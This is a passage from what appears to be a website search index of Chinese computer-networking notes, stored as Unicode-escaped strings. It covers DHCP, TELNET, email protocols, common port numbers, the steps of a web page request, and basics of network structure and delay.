\u63D0\u4F9B\u4E86\u5373\u63D2\u5373\u7528\u7684\u8FDE\u7F51\u65B9\u5F0F\uFF0C\u7528\u6237\u4E0D\u518D\u9700\u8981\u624B\u52A8\u914D\u7F6E IP \u5730\u5740\u7B49\u4FE1\u606F\u3002
DHCP \u914D\u7F6E\u7684\u5185\u5BB9\u4E0D\u4EC5\u662F IP \u5730\u5740\uFF0C\u8FD8\u5305\u62EC\u5B50\u7F51\u63A9\u7801\u3001\u7F51\u5173 IP \u5730\u5740\u3002
DHCP \u5DE5\u4F5C\u8FC7\u7A0B\u5982\u4E0B\uFF1A \u5BA2\u6237\u7AEF\u53D1\u9001 Discover \u62A5\u6587\uFF0C\u8BE5\u62A5\u6587\u7684\u76EE\u7684\u5730\u5740\u4E3A 255.255.255.255:67\uFF0C\u6E90\u5730\u5740\u4E3A 0.0.0.0:68\uFF0C\u88AB\u653E\u5165 UDP \u4E2D\uFF0C\u8BE5\u62A5\u6587\u88AB\u5E7F\u64AD\u5230\u540C\u4E00\u4E2A\u5B50\u7F51\u7684\u6240\u6709\u4E3B\u673A\u4E0A\u3002\u5982\u679C\u5BA2\u6237\u7AEF\u548C DHCP \u670D\u52A1\u5668\u4E0D\u5728\u540C\u4E00\u4E2A\u5B50\u7F51\uFF0C\u5C31\u9700\u8981\u4F7F\u7528\u4E2D\u7EE7\u4EE3\u7406\u3002
DHCP \u670D\u52A1\u5668\u6536\u5230 Discover \u62A5\u6587\u4E4B\u540E\uFF0C\u53D1\u9001 Offer \u62A5\u6587\u7ED9\u5BA2\u6237\u7AEF\uFF0C\u8BE5\u62A5\u6587\u5305\u542B\u4E86\u5BA2\u6237\u7AEF\u6240\u9700\u8981\u7684\u4FE1\u606F\u3002\u56E0\u4E3A\u5BA2\u6237\u7AEF\u53EF\u80FD\u6536\u5230\u591A\u4E2A DHCP \u670D\u52A1\u5668\u63D0\u4F9B\u7684\u4FE1\u606F\uFF0C\u56E0\u6B64\u5BA2\u6237\u7AEF\u9700\u8981\u8FDB\u884C\u9009\u62E9\u3002
\u5982\u679C\u5BA2\u6237\u7AEF\u9009\u62E9\u4E86\u67D0\u4E2A DHCP \u670D\u52A1\u5668\u63D0\u4F9B\u7684\u4FE1\u606F\uFF0C\u90A3\u4E48\u5C31\u53D1\u9001 Request \u62A5\u6587\u7ED9\u8BE5 DHCP \u670D\u52A1\u5668\u3002
DHCP \u670D\u52A1\u5668\u53D1\u9001 Ack \u62A5\u6587\uFF0C\u8868\u793A\u5BA2\u6237\u7AEF\u6B64\u65F6\u53EF\u4EE5\u4F7F\u7528\u63D0\u4F9B\u7ED9\u5B83\u7684\u4FE1\u606F\u3002`},{header:"\u8FDC\u7A0B\u767B\u5F55\u534F\u8BAE",slug:"\u8FDC\u7A0B\u767B\u5F55\u534F\u8BAE",content:`TELNET \u7528\u4E8E\u767B\u5F55\u5230\u8FDC\u7A0B\u4E3B\u673A\u4E0A\uFF0C\u5E76\u4E14\u8FDC\u7A0B\u4E3B\u673A\u4E0A\u7684\u8F93\u51FA\u4E5F\u4F1A\u8FD4\u56DE\u3002
TELNET \u53EF\u4EE5\u9002\u5E94\u8BB8\u591A\u8BA1\u7B97\u673A\u548C\u64CD\u4F5C\u7CFB\u7EDF\u7684\u5DEE\u5F02\uFF0C\u4F8B\u5982\u4E0D\u540C\u64CD\u4F5C\u7CFB\u7EDF\u7CFB\u7EDF\u7684\u6362\u884C\u7B26\u5B9A\u4E49\u3002`},{header:"\u7535\u5B50\u90AE\u4EF6\u534F\u8BAE",slug:"\u7535\u5B50\u90AE\u4EF6\u534F\u8BAE",content:`\u4E00\u4E2A\u7535\u5B50\u90AE\u4EF6\u7CFB\u7EDF\u7531\u4E09\u90E8\u5206\u7EC4\u6210\uFF1A\u7528\u6237\u4EE3\u7406\u3001\u90AE\u4EF6\u670D\u52A1\u5668\u4EE5\u53CA\u90AE\u4EF6\u534F\u8BAE\u3002
\u90AE\u4EF6\u534F\u8BAE\u5305\u542B\u53D1\u9001\u534F\u8BAE\u548C\u8BFB\u53D6\u534F\u8BAE\uFF0C\u53D1\u9001\u534F\u8BAE\u5E38\u7528 SMTP\uFF0C\u8BFB\u53D6\u534F\u8BAE\u5E38\u7528 POP3 \u548C IMAP\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7b3efa99-d306-4982-8cfb-e7153c33aab4.png" width="700)`},{header:"1. SMTP",slug:"_1-smtp",content:`SMTP \u53EA\u80FD\u53D1\u9001 ASCII \u7801\uFF0C\u800C\u4E92\u8054\u7F51\u90AE\u4EF6\u6269\u5145 MIME \u53EF\u4EE5\u53D1\u9001\u4E8C\u8FDB\u5236\u6587\u4EF6\u3002MIME \u5E76\u6CA1\u6709\u6539\u52A8\u6216\u8005\u53D6\u4EE3 SMTP\uFF0C\u800C\u662F\u589E\u52A0\u90AE\u4EF6\u4E3B\u4F53\u7684\u7ED3\u6784\uFF0C\u5B9A\u4E49\u4E86\u975E ASCII \u7801\u7684\u7F16\u7801\u89C4\u5219\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ed5522bb-3a60-481c-8654-43e7195a48fe.png" width=")`},{header:"2. POP3",slug:"_2-pop3",content:"POP3 \u7684\u7279\u70B9\u662F\u53EA\u8981\u7528\u6237\u4ECE\u670D\u52A1\u5668\u4E0A\u8BFB\u53D6\u4E86\u90AE\u4EF6\uFF0C\u5C31\u628A\u8BE5\u90AE\u4EF6\u5220\u9664\u3002\u4F46\u6700\u65B0\u7248\u672C\u7684 POP3 \u53EF\u4EE5\u4E0D\u5220\u9664\u90AE\u4EF6\u3002"},{header:"3. IMAP",slug:"_3-imap",content:"IMAP \u534F\u8BAE\u4E2D\u5BA2\u6237\u7AEF\u548C\u670D\u52A1\u5668\u4E0A\u7684\u90AE\u4EF6\u4FDD\u6301\u540C\u6B65\uFF0C\u5982\u679C\u4E0D\u624B\u52A8\u5220\u9664\u90AE\u4EF6\uFF0C\u90A3\u4E48\u670D\u52A1\u5668\u4E0A\u7684\u90AE\u4EF6\u4E5F\u4E0D\u4F1A\u88AB\u5220\u9664\u3002IMAP \u8FD9\u79CD\u505A\u6CD5\u53EF\u4EE5\u8BA9\u7528\u6237\u968F\u65F6\u968F\u5730\u53BB\u8BBF\u95EE\u670D\u52A1\u5668\u4E0A\u7684\u90AE\u4EF6\u3002"},{header:"\u5E38\u7528\u7AEF\u53E3",slug:"\u5E38\u7528\u7AEF\u53E3",content:`\u5E94\u7528
\u5E94\u7528\u5C42\u534F\u8BAE
\u7AEF\u53E3\u53F7
\u4F20\u8F93\u5C42\u534F\u8BAE
\u5907\u6CE8 \u57DF\u540D\u89E3\u6790
DNS
53
UDP/TCP
\u957F\u5EA6\u8D85\u8FC7 512 \u5B57\u8282\u65F6\u4F7F\u7528 TCP \u52A8\u6001\u4E3B\u673A\u914D\u7F6E\u534F\u8BAE
DHCP
67/68
UDP \u7B80\u5355\u7F51\u7EDC\u7BA1\u7406\u534F\u8BAE
SNMP
161/162
UDP \u6587\u4EF6\u4F20\u9001\u534F\u8BAE
FTP
20/21
TCP
\u63A7\u5236\u8FDE\u63A5 21\uFF0C\u6570\u636E\u8FDE\u63A5 20 \u8FDC\u7A0B\u7EC8\u7AEF\u534F\u8BAE
TELNET
23
TCP \u8D85\u6587\u672C\u4F20\u9001\u534F\u8BAE
HTTP
80
TCP \u7B80\u5355\u90AE\u4EF6\u4F20\u9001\u534F\u8BAE
SMTP
25
TCP \u90AE\u4EF6\u8BFB\u53D6\u534F\u8BAE
POP3
110
TCP \u7F51\u9645\u62A5\u6587\u5B58\u53D6\u534F\u8BAE
IMAP
143
TCP`},{header:"Web \u9875\u9762\u8BF7\u6C42\u8FC7\u7A0B",slug:"web-\u9875\u9762\u8BF7\u6C42\u8FC7\u7A0B",content:""},{header:"1. DHCP \u914D\u7F6E\u4E3B\u673A\u4FE1\u606F",slug:"_1-dhcp-\u914D\u7F6E\u4E3B\u673A\u4FE1\u606F",content:"\u5047\u8BBE\u4E3B\u673A\u6700\u5F00\u59CB\u6CA1\u6709 IP \u5730\u5740\u4EE5\u53CA\u5176\u5B83\u4FE1\u606F\uFF0C\u90A3\u4E48\u5C31\u9700\u8981\u5148\u4F7F\u7528 DHCP \u6765\u83B7\u53D6\u3002 \u4E3B\u673A\u751F\u6210\u4E00\u4E2A DHCP \u8BF7\u6C42\u62A5\u6587\uFF0C\u5E76\u5C06\u8FD9\u4E2A\u62A5\u6587\u653E\u5165\u5177\u6709\u76EE\u7684\u7AEF\u53E3 67 \u548C\u6E90\u7AEF\u53E3 68 \u7684 UDP \u62A5\u6587\u6BB5\u4E2D\u3002 \u8BE5\u62A5\u6587\u6BB5\u5219\u88AB\u653E\u5165\u5728\u4E00\u4E2A\u5177\u6709\u5E7F\u64AD IP \u76EE\u7684\u5730\u5740(255.255.255.255) \u548C\u6E90 IP \u5730\u5740\uFF080.0.0.0\uFF09\u7684 IP \u6570\u636E\u62A5\u4E2D\u3002 \u8BE5\u6570\u636E\u62A5\u5219\u88AB\u653E\u7F6E\u5728 MAC \u5E27\u4E2D\uFF0C\u8BE5\u5E27\u5177\u6709\u76EE\u7684\u5730\u5740 FF:<zero-width space>FF:<zero-width space>FF:<zero-width space>FF:<zero-width space>FF:FF\uFF0C\u5C06\u5E7F\u64AD\u5230\u4E0E\u4EA4\u6362\u673A\u8FDE\u63A5\u7684\u6240\u6709\u8BBE\u5907\u3002 \u8FDE\u63A5\u5728\u4EA4\u6362\u673A\u7684 DHCP \u670D\u52A1\u5668\u6536\u5230\u5E7F\u64AD\u5E27\u4E4B\u540E\uFF0C\u4E0D\u65AD\u5730\u5411\u4E0A\u5206\u89E3\u5F97\u5230 IP \u6570\u636E\u62A5\u3001UDP \u62A5\u6587\u6BB5\u3001DHCP \u8BF7\u6C42\u62A5\u6587\uFF0C\u4E4B\u540E\u751F\u6210 DHCP ACK \u62A5\u6587\uFF0C\u8BE5\u62A5\u6587\u5305\u542B\u4EE5\u4E0B\u4FE1\u606F\uFF1AIP \u5730\u5740\u3001DNS \u670D\u52A1\u5668\u7684 IP \u5730\u5740\u3001\u9ED8\u8BA4\u7F51\u5173\u8DEF\u7531\u5668\u7684 IP \u5730\u5740\u548C\u5B50\u7F51\u63A9\u7801\u3002\u8BE5\u62A5\u6587\u88AB\u653E\u5165 UDP \u62A5\u6587\u6BB5\u4E2D\uFF0CUDP \u62A5\u6587\u6BB5\u6709\u88AB\u653E\u5165 IP \u6570\u636E\u62A5\u4E2D\uFF0C\u6700\u540E\u653E\u5165 MAC \u5E27\u4E2D\u3002 \u8BE5\u5E27\u7684\u76EE\u7684\u5730\u5740\u662F\u8BF7\u6C42\u4E3B\u673A\u7684 MAC \u5730\u5740\uFF0C\u56E0\u4E3A\u4EA4\u6362\u673A\u5177\u6709\u81EA\u5B66\u4E60\u80FD\u529B\uFF0C\u4E4B\u524D\u4E3B\u673A\u53D1\u9001\u4E86\u5E7F\u64AD\u5E27\u4E4B\u540E\u5C31\u8BB0\u5F55\u4E86 MAC \u5730\u5740\u5230\u5176\u8F6C\u53D1\u63A5\u53E3\u7684\u4EA4\u6362\u8868\u9879\uFF0C\u56E0\u6B64\u73B0\u5728\u4EA4\u6362\u673A\u5C31\u53EF\u4EE5\u76F4\u63A5\u77E5\u9053\u5E94\u8BE5\u5411\u54EA\u4E2A\u63A5\u53E3\u53D1\u9001\u8BE5\u5E27\u3002 \u4E3B\u673A\u6536\u5230\u8BE5\u5E27\u540E\uFF0C\u4E0D\u65AD\u5206\u89E3\u5F97\u5230 DHCP \u62A5\u6587\u3002\u4E4B\u540E\u5C31\u914D\u7F6E\u5B83\u7684 IP \u5730\u5740\u3001\u5B50\u7F51\u63A9\u7801\u548C DNS \u670D\u52A1\u5668\u7684 IP \u5730\u5740\uFF0C\u5E76\u5728\u5176 IP \u8F6C\u53D1\u8868\u4E2D\u5B89\u88C5\u9ED8\u8BA4\u7F51\u5173\u3002"},{header:"2. ARP \u89E3\u6790 MAC \u5730\u5740",slug:"_2-arp-\u89E3\u6790-mac-\u5730\u5740",content:"\u4E3B\u673A\u901A\u8FC7\u6D4F\u89C8\u5668\u751F\u6210\u4E00\u4E2A TCP \u5957\u63A5\u5B57\uFF0C\u5957\u63A5\u5B57\u5411 HTTP \u670D\u52A1\u5668\u53D1\u9001 HTTP \u8BF7\u6C42\u3002\u4E3A\u4E86\u751F\u6210\u8BE5\u5957\u63A5\u5B57\uFF0C\u4E3B\u673A\u9700\u8981\u77E5\u9053\u7F51\u7AD9\u7684\u57DF\u540D\u5BF9\u5E94\u7684 IP \u5730\u5740\u3002 \u4E3B\u673A\u751F\u6210\u4E00\u4E2A DNS \u67E5\u8BE2\u62A5\u6587\uFF0C\u8BE5\u62A5\u6587\u5177\u6709 53 \u53F7\u7AEF\u53E3\uFF0C\u56E0\u4E3A DNS \u670D\u52A1\u5668\u7684\u7AEF\u53E3\u53F7\u662F 53\u3002 \u8BE5 DNS \u67E5\u8BE2\u62A5\u6587\u88AB\u653E\u5165\u76EE\u7684\u5730\u5740\u4E3A DNS \u670D\u52A1\u5668 IP \u5730\u5740\u7684 IP \u6570\u636E\u62A5\u4E2D\u3002 \u8BE5 IP \u6570\u636E\u62A5\u88AB\u653E\u5165\u4E00\u4E2A\u4EE5\u592A\u7F51\u5E27\u4E2D\uFF0C\u8BE5\u5E27\u5C06\u53D1\u9001\u5230\u7F51\u5173\u8DEF\u7531\u5668\u3002 DHCP \u8FC7\u7A0B\u53EA\u77E5\u9053\u7F51\u5173\u8DEF\u7531\u5668\u7684 IP \u5730\u5740\uFF0C\u4E3A\u4E86\u83B7\u53D6\u7F51\u5173\u8DEF\u7531\u5668\u7684 MAC \u5730\u5740\uFF0C\u9700\u8981\u4F7F\u7528 ARP \u534F\u8BAE\u3002 \u4E3B\u673A\u751F\u6210\u4E00\u4E2A\u5305\u542B\u76EE\u7684\u5730\u5740\u4E3A\u7F51\u5173\u8DEF\u7531\u5668 IP \u5730\u5740\u7684 ARP \u67E5\u8BE2\u62A5\u6587\uFF0C\u5C06\u8BE5 ARP \u67E5\u8BE2\u62A5\u6587\u653E\u5165\u4E00\u4E2A\u5177\u6709\u5E7F\u64AD\u76EE\u7684\u5730\u5740\uFF08FF:<zero-width space>FF:<zero-width space>FF:<zero-width space>FF:<zero-width space>FF:FF\uFF09\u7684\u4EE5\u592A\u7F51\u5E27\u4E2D\uFF0C\u5E76\u5411\u4EA4\u6362\u673A\u53D1\u9001\u8BE5\u4EE5\u592A\u7F51\u5E27\uFF0C\u4EA4\u6362\u673A\u5C06\u8BE5\u5E27\u8F6C\u53D1\u7ED9\u6240\u6709\u7684\u8FDE\u63A5\u8BBE\u5907\uFF0C\u5305\u62EC\u7F51\u5173\u8DEF\u7531\u5668\u3002 \u7F51\u5173\u8DEF\u7531\u5668\u63A5\u6536\u5230\u8BE5\u5E27\u540E\uFF0C\u4E0D\u65AD\u5411\u4E0A\u5206\u89E3\u5F97\u5230 ARP \u62A5\u6587\uFF0C\u53D1\u73B0\u5176\u4E2D\u7684 IP \u5730\u5740\u4E0E\u5176\u63A5\u53E3\u7684 IP \u5730\u5740\u5339\u914D\uFF0C\u56E0\u6B64\u5C31\u53D1\u9001\u4E00\u4E2A ARP \u56DE\u7B54\u62A5\u6587\uFF0C\u5305\u542B\u4E86\u5B83\u7684 MAC \u5730\u5740\uFF0C\u53D1\u56DE\u7ED9\u4E3B\u673A\u3002"},{header:"3. DNS \u89E3\u6790\u57DF\u540D",slug:"_3-dns-\u89E3\u6790\u57DF\u540D",content:"\u77E5\u9053\u4E86\u7F51\u5173\u8DEF\u7531\u5668\u7684 MAC \u5730\u5740\u4E4B\u540E\uFF0C\u5C31\u53EF\u4EE5\u7EE7\u7EED DNS \u7684\u89E3\u6790\u8FC7\u7A0B\u4E86\u3002 \u7F51\u5173\u8DEF\u7531\u5668\u63A5\u6536\u5230\u5305\u542B DNS \u67E5\u8BE2\u62A5\u6587\u7684\u4EE5\u592A\u7F51\u5E27\u540E\uFF0C\u62BD\u53D6\u51FA IP \u6570\u636E\u62A5\uFF0C\u5E76\u6839\u636E\u8F6C\u53D1\u8868\u51B3\u5B9A\u8BE5 IP \u6570\u636E\u62A5\u5E94\u8BE5\u8F6C\u53D1\u7684\u8DEF\u7531\u5668\u3002 \u56E0\u4E3A\u8DEF\u7531\u5668\u5177\u6709\u5185\u90E8\u7F51\u5173\u534F\u8BAE\uFF08RIP\u3001OSPF\uFF09\u548C\u5916\u90E8\u7F51\u5173\u534F\u8BAE\uFF08BGP\uFF09\u8FD9\u4E24\u79CD\u8DEF\u7531\u9009\u62E9\u534F\u8BAE\uFF0C\u56E0\u6B64\u8DEF\u7531\u8868\u4E2D\u5DF2\u7ECF\u914D\u7F6E\u4E86\u7F51\u5173\u8DEF\u7531\u5668\u5230\u8FBE DNS \u670D\u52A1\u5668\u7684\u8DEF\u7531\u8868\u9879\u3002 \u5230\u8FBE DNS \u670D\u52A1\u5668\u4E4B\u540E\uFF0CDNS \u670D\u52A1\u5668\u62BD\u53D6\u51FA DNS \u67E5\u8BE2\u62A5\u6587\uFF0C\u5E76\u5728 DNS \u6570\u636E\u5E93\u4E2D\u67E5\u627E\u5F85\u89E3\u6790\u7684\u57DF\u540D\u3002 \u627E\u5230 DNS \u8BB0\u5F55\u4E4B\u540E\uFF0C\u53D1\u9001 DNS \u56DE\u7B54\u62A5\u6587\uFF0C\u5C06\u8BE5\u56DE\u7B54\u62A5\u6587\u653E\u5165 UDP \u62A5\u6587\u6BB5\u4E2D\uFF0C\u7136\u540E\u653E\u5165 IP \u6570\u636E\u62A5\u4E2D\uFF0C\u901A\u8FC7\u8DEF\u7531\u5668\u53CD\u5411\u8F6C\u53D1\u56DE\u7F51\u5173\u8DEF\u7531\u5668\uFF0C\u5E76\u7ECF\u8FC7\u4EE5\u592A\u7F51\u4EA4\u6362\u673A\u5230\u8FBE\u4E3B\u673A\u3002"},{header:"4. HTTP \u8BF7\u6C42\u9875\u9762",slug:"_4-http-\u8BF7\u6C42\u9875\u9762",content:"\u6709\u4E86 HTTP \u670D\u52A1\u5668\u7684 IP \u5730\u5740\u4E4B\u540E\uFF0C\u4E3B\u673A\u5C31\u80FD\u591F\u751F\u6210 TCP \u5957\u63A5\u5B57\uFF0C\u8BE5\u5957\u63A5\u5B57\u5C06\u7528\u4E8E\u5411 Web \u670D\u52A1\u5668\u53D1\u9001 HTTP GET \u62A5\u6587\u3002 \u5728\u751F\u6210 TCP \u5957\u63A5\u5B57\u4E4B\u524D\uFF0C\u5FC5\u987B\u5148\u4E0E HTTP \u670D\u52A1\u5668\u8FDB\u884C\u4E09\u6B21\u63E1\u624B\u6765\u5EFA\u7ACB\u8FDE\u63A5\u3002\u751F\u6210\u4E00\u4E2A\u5177\u6709\u76EE\u7684\u7AEF\u53E3 80 \u7684 TCP SYN \u62A5\u6587\u6BB5\uFF0C\u5E76\u5411 HTTP \u670D\u52A1\u5668\u53D1\u9001\u8BE5\u62A5\u6587\u6BB5\u3002 HTTP \u670D\u52A1\u5668\u6536\u5230\u8BE5\u62A5\u6587\u6BB5\u4E4B\u540E\uFF0C\u751F\u6210 TCP SYN ACK \u62A5\u6587\u6BB5\uFF0C\u53D1\u56DE\u7ED9\u4E3B\u673A\u3002 \u8FDE\u63A5\u5EFA\u7ACB\u4E4B\u540E\uFF0C\u6D4F\u89C8\u5668\u751F\u6210 HTTP GET \u62A5\u6587\uFF0C\u5E76\u4EA4\u4ED8\u7ED9 HTTP \u670D\u52A1\u5668\u3002 HTTP \u670D\u52A1\u5668\u4ECE TCP \u5957\u63A5\u5B57\u8BFB\u53D6 HTTP GET \u62A5\u6587\uFF0C\u751F\u6210\u4E00\u4E2A HTTP \u54CD\u5E94\u62A5\u6587\uFF0C\u5C06 Web \u9875\u9762\u5185\u5BB9\u653E\u5165\u62A5\u6587\u4E3B\u4F53\u4E2D\uFF0C\u53D1\u56DE\u7ED9\u4E3B\u673A\u3002 \u6D4F\u89C8\u5668\u6536\u5230 HTTP \u54CD\u5E94\u62A5\u6587\u540E\uFF0C\u62BD\u53D6\u51FA Web \u9875\u9762\u5185\u5BB9\uFF0C\u4E4B\u540E\u8FDB\u884C\u6E32\u67D3\uFF0C\u663E\u793A Web \u9875\u9762\u3002"}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E6%A6%82%E8%BF%B0.html",title:"\u8BA1\u7B97\u673A\u7F51\u7EDC - \u6982\u8FF0",pathLocale:"/",contents:[{header:"\u8BA1\u7B97\u673A\u7F51\u7EDC - \u6982\u8FF0",slug:"\u8BA1\u7B97\u673A\u7F51\u7EDC-\u6982\u8FF0",content:`\u8BA1\u7B97\u673A\u7F51\u7EDC - \u6982\u8FF0 \u7F51\u7EDC\u7684\u7F51\u7EDC
ISP
\u4E3B\u673A\u4E4B\u95F4\u7684\u901A\u4FE1\u65B9\u5F0F
\u7535\u8DEF\u4EA4\u6362\u4E0E\u5206\u7EC4\u4EA4\u6362 1. \u7535\u8DEF\u4EA4\u6362
2. \u5206\u7EC4\u4EA4\u6362 \u65F6\u5EF6 1. \u6392\u961F\u65F6\u5EF6
2. \u5904\u7406\u65F6\u5EF6
3. \u4F20\u8F93\u65F6\u5EF6
4. \u4F20\u64AD\u65F6\u5EF6 \u8BA1\u7B97\u673A\u7F51\u7EDC\u4F53\u7CFB\u7ED3\u6784 1. \u4E94\u5C42\u534F\u8BAE
2. OSI
3. TCP/IP
4. \u6570\u636E\u5728\u5404\u5C42\u4E4B\u95F4\u7684\u4F20\u9012\u8FC7\u7A0B`},{header:"\u7F51\u7EDC\u7684\u7F51\u7EDC",slug:"\u7F51\u7EDC\u7684\u7F51\u7EDC",content:`\u7F51\u7EDC\u628A\u4E3B\u673A\u8FDE\u63A5\u8D77\u6765\uFF0C\u800C\u4E92\u8FDE\u7F51\uFF08internet\uFF09\u662F\u628A\u591A\u79CD\u4E0D\u540C\u7684\u7F51\u7EDC\u8FDE\u63A5\u8D77\u6765\uFF0C\u56E0\u6B64\u4E92\u8FDE\u7F51\u662F\u7F51\u7EDC\u7684\u7F51\u7EDC\u3002\u800C\u4E92\u8054\u7F51\uFF08Internet\uFF09\u662F\u5168\u7403\u8303\u56F4\u7684\u4E92\u8FDE\u7F51\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/network-of-networks.gif" width="450)`},{header:"ISP",slug:"isp",content:`\u4E92\u8054\u7F51\u670D\u52A1\u63D0\u4F9B\u5546 ISP \u53EF\u4EE5\u4ECE\u4E92\u8054\u7F51\u7BA1\u7406\u673A\u6784\u83B7\u5F97\u8BB8\u591A IP \u5730\u5740\uFF0C\u540C\u65F6\u62E5\u6709\u901A\u4FE1\u7EBF\u8DEF\u4EE5\u53CA\u8DEF\u7531\u5668\u7B49\u8054\u7F51\u8BBE\u5907\uFF0C\u4E2A\u4EBA\u6216\u673A\u6784\u5411 ISP \u7F34\u7EB3\u4E00\u5B9A\u7684\u8D39\u7528\u5C31\u53EF\u4EE5\u63A5\u5165\u4E92\u8054\u7F51\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/72be01cd-41ae-45f7-99b9-a8d284e44dd4.png" width="500)
\u76EE\u524D\u7684\u4E92\u8054\u7F51\u662F\u4E00\u79CD\u591A\u5C42\u6B21 ISP \u7ED3\u6784\uFF0CISP \u6839\u636E\u8986\u76D6\u9762\u79EF\u7684\u5927\u5C0F\u5206\u4E3A\u7B2C\u4E00\u5C42 ISP\u3001\u533A\u57DF ISP \u548C\u63A5\u5165 ISP\u3002\u4E92\u8054\u7F51\u4EA4\u6362\u70B9 IXP \u5141\u8BB8\u4E24\u4E2A ISP \u76F4\u63A5\u76F8\u8FDE\u800C\u4E0D\u7528\u7ECF\u8FC7\u7B2C\u4E09\u4E2A ISP\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/3be42601-9d33-4d29-8358-a9d16453af93.png" width="500)`},{header:"\u4E3B\u673A\u4E4B\u95F4\u7684\u901A\u4FE1\u65B9\u5F0F",slug:"\u4E3B\u673A\u4E4B\u95F4\u7684\u901A\u4FE1\u65B9\u5F0F",content:'\u5BA2\u6237-\u670D\u52A1\u5668\uFF08C/S\uFF09\uFF1A\u5BA2\u6237\u662F\u670D\u52A1\u7684\u8BF7\u6C42\u65B9\uFF0C\u670D\u52A1\u5668\u662F\u670D\u52A1\u7684\u63D0\u4F9B\u65B9\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/914894c2-0bc4-46b5-bef9-0316a69ef521.jpg" width="240px"> \u5BF9\u7B49\uFF08P2P\uFF09\uFF1A\u4E0D\u533A\u5206\u5BA2\u6237\u548C\u670D\u52A1\u5668\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/42430e94-3137-48c0-bdb6-3cebaf9102e3.jpg" width="200px">'},{header:"\u7535\u8DEF\u4EA4\u6362\u4E0E\u5206\u7EC4\u4EA4\u6362",slug:"\u7535\u8DEF\u4EA4\u6362\u4E0E\u5206\u7EC4\u4EA4\u6362",content:""},{header:"1. \u7535\u8DEF\u4EA4\u6362",slug:"_1-\u7535\u8DEF\u4EA4\u6362",content:"\u7535\u8DEF\u4EA4\u6362\u7528\u4E8E\u7535\u8BDD\u901A\u4FE1\u7CFB\u7EDF\uFF0C\u4E24\u4E2A\u7528\u6237\u8981\u901A\u4FE1\u4E4B\u524D\u9700\u8981\u5EFA\u7ACB\u4E00\u6761\u4E13\u7528\u7684\u7269\u7406\u94FE\u8DEF\uFF0C\u5E76\u4E14\u5728\u6574\u4E2A\u901A\u4FE1\u8FC7\u7A0B\u4E2D\u59CB\u7EC8\u5360\u7528\u8BE5\u94FE\u8DEF\u3002\u7531\u4E8E\u901A\u4FE1\u7684\u8FC7\u7A0B\u4E2D\u4E0D\u53EF\u80FD\u4E00\u76F4\u5728\u4F7F\u7528\u4F20\u8F93\u7EBF\u8DEF\uFF0C\u56E0\u6B64\u7535\u8DEF\u4EA4\u6362\u5BF9\u7EBF\u8DEF\u7684\u5229\u7528\u7387\u5F88\u4F4E\uFF0C\u5F80\u5F80\u4E0D\u5230 10%\u3002"},{header:"2. \u5206\u7EC4\u4EA4\u6362",slug:"_2-\u5206\u7EC4\u4EA4\u6362",content:`\u6BCF\u4E2A\u5206\u7EC4\u90FD\u6709\u9996\u90E8\u548C\u5C3E\u90E8\uFF0C\u5305\u542B\u4E86\u6E90\u5730\u5740\u548C\u76EE\u7684\u5730\u5740\u7B49\u63A7\u5236\u4FE1\u606F\uFF0C\u5728\u540C\u4E00\u4E2A\u4F20\u8F93\u7EBF\u8DEF\u4E0A\u540C\u65F6\u4F20\u8F93\u591A\u4E2A\u5206\u7EC4\u4E92\u76F8\u4E0D\u4F1A\u5F71\u54CD\uFF0C\u56E0\u6B64\u5728\u540C\u4E00\u6761\u4F20\u8F93\u7EBF\u8DEF\u4E0A\u5141\u8BB8\u540C\u65F6\u4F20\u8F93\u591A\u4E2A\u5206\u7EC4\uFF0C\u4E5F\u5C31\u662F\u8BF4\u5206\u7EC4\u4EA4\u6362\u4E0D\u9700\u8981\u5360\u7528\u4F20\u8F93\u7EBF\u8DEF\u3002
\u5728\u4E00\u4E2A\u90AE\u5C40\u901A\u4FE1\u7CFB\u7EDF\u4E2D\uFF0C\u90AE\u5C40\u6536\u5230\u4E00\u4EFD\u90AE\u4EF6\u4E4B\u540E\uFF0C\u5148\u5B58\u50A8\u4E0B\u6765\uFF0C\u7136\u540E\u628A\u76F8\u540C\u76EE\u7684\u5730\u7684\u90AE\u4EF6\u4E00\u8D77\u8F6C\u53D1\u5230\u4E0B\u4E00\u4E2A\u76EE\u7684\u5730\uFF0C\u8FD9\u4E2A\u8FC7\u7A0B\u5C31\u662F\u5B58\u50A8\u8F6C\u53D1\u8FC7\u7A0B\uFF0C\u5206\u7EC4\u4EA4\u6362\u4E5F\u4F7F\u7528\u4E86\u5B58\u50A8\u8F6C\u53D1\u8FC7\u7A0B\u3002`},{header:"\u65F6\u5EF6",slug:"\u65F6\u5EF6",content:`\u603B\u65F6\u5EF6 = \u6392\u961F\u65F6\u5EF6 + \u5904\u7406\u65F6\u5EF6 + \u4F20\u8F93\u65F6\u5EF6 + \u4F20\u64AD\u65F6\u5EF6
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4b2ae78c-e254-44df-9e37-578e2f2bef52.jpg" width="380)`},{header:"1. \u6392\u961F\u65F6\u5EF6",slug:"_1-\u6392\u961F\u65F6\u5EF6",content:"\u5206\u7EC4\u5728\u8DEF\u7531\u5668\u7684\u8F93\u5165\u961F\u5217\u548C\u8F93\u51FA\u961F\u5217\u4E2D\u6392\u961F\u7B49\u5F85\u7684\u65F6\u95F4\uFF0C\u53D6\u51B3\u4E8E\u7F51\u7EDC\u5F53\u524D\u7684\u901A\u4FE1\u91CF\u3002"},{header:"2. \u5904\u7406\u65F6\u5EF6",slug:"_2-\u5904\u7406\u65F6\u5EF6",content:"\u4E3B\u673A\u6216\u8DEF\u7531\u5668\u6536\u5230\u5206\u7EC4\u65F6\u8FDB\u884C\u5904\u7406\u6240\u9700\u8981\u7684\u65F6\u95F4\uFF0C\u4F8B\u5982\u5206\u6790\u9996\u90E8\u3001\u4ECE\u5206\u7EC4\u4E2D\u63D0\u53D6\u6570\u636E\u3001\u8FDB\u884C\u5DEE\u9519\u68C0\u9A8C\u6216\u67E5\u627E\u9002\u5F53\u7684\u8DEF\u7531\u7B49\u3002"},{header:"3. 